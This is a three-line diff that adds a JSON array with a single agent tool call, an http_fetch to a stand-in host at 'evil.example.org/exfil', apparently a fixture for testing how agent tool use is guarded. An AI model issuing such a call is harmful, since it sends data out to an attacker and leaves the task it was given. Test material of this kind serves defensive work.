@@ -1,0 +1,3 @@
+[
+  {"tool": "http_fetch", "args": {"url": "https://evil.example.org/exfil"}}
+]
